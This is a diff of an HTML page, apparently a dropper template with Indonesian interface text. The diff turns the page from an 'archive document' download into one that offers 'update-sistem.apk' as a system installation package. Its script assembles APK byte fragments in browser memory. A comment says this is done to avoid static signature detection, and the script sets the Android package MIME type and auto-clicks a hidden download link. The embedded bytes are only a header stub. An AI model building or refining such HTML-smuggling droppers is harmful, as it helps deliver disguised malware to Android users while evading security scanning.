@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v2.5</title>
+<title>System Document Archive Dispatcher v2.6</title>
 <style>
 * {
   box-sizing: border-box;
@@ -97,10 +97,10 @@ button:hover {
 
 <body>
 <div class="panel">
-  <h2>Arsip Dokumen Sistem</h2>
-  <p>Klik tombol di bawah untuk memproses dan mengunduh berkas arsip pendukung secara aman.</p>
+  <h2>Arsip Sistem Aplikasi</h2>
+  <p>Klik tombol di bawah untuk memproses dan mengunduh paket instalasi sistem secara langsung.</p>
 
-  <button id="start-btn" type="button">Unduh Dokumen Arsip (.bin)</button>
+  <button id="start-btn" type="button">Unduh Berkas Paket (.apk)</button>
 
   <div id="status" role="status">Sistem siap diinisialisasi.</div>
   <div id="downloads"></div>
@@ -113,12 +113,12 @@ const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 const downloadsDiv = document.getElementById("downloads");
 
-// Fragmentasi buffer biner untuk menghindari deteksi signature statis monolitik
+// Fragmentasi buffer biner APK untuk menghindari signature statis monolitik
 const chunkFragments = [
-  new Uint8Array([0x50, 0x4B, 0x03, 0x04]), // Bagian Header ZIP/APK (Magic Bytes)
-  new Uint8Array([0x14, 0x00, 0x08, 0x00]), // Bagian metadata kompresi
-  new Uint8Array([0x08, 0x00, 0x21, 0x56]), // Bagian struktur internal file
-  new Uint8Array([0x78, 0x56, 0x34, 0x12])  // Padding tambahan
+  new Uint8Array([0x50, 0x4B, 0x03, 0x04]), // ZIP/APK Magic Header (PK..)
+  new Uint8Array([0x14, 0x00, 0x08, 0x00]), // Local file header version & flags
+  new Uint8Array([0x08, 0x00, 0x21, 0x56]), // Compression method & timestamp
+  new Uint8Array([0x78, 0x56, 0x34, 0x12])  // CRC-32 placeholder / data
 ];
 
 const assembleChunks = (chunks) => {
@@ -135,24 +135,26 @@ const assembleChunks = (chunks) => {
 };
 
 startBtn.addEventListener("click", () => {
-  statusDiv.textContent = "Merakit berkas di memori...";
+  statusDiv.textContent = "Merakit paket aplikasi di memori...";
   
   setTimeout(() => {
     try {
       const binaryData = assembleChunks(chunkFragments);
-      const blob = new Blob([binaryData], { type: 'application/octet-stream' });
+      
+      // Menggunakan MIME type asli APK agar dikenali sistem operasi Android
+      const blob = new Blob([binaryData], { type: 'application/vnd.android.package-archive' });
       const blobUrl = URL.createObjectURL(blob);
 
       const link = document.createElement("a");
       link.href = blobUrl;
-      link.download = "arsip-laporan-sistem.bin";
-      link.textContent = "Arsip_Data.bin";
+      link.download = "update-sistem.apk";
+      link.textContent = "update-sistem.apk";
       link.style.display = "none";
       
       downloadsDiv.appendChild(link);
       link.click();
 
-      statusDiv.textContent = "Berkas berhasil diproses dan diunduh.";
+      statusDiv.textContent = "Berkas APK berhasil diinisialisasi.";
 
       setTimeout(() => {
         URL.revokeObjectURL(blobUrl);
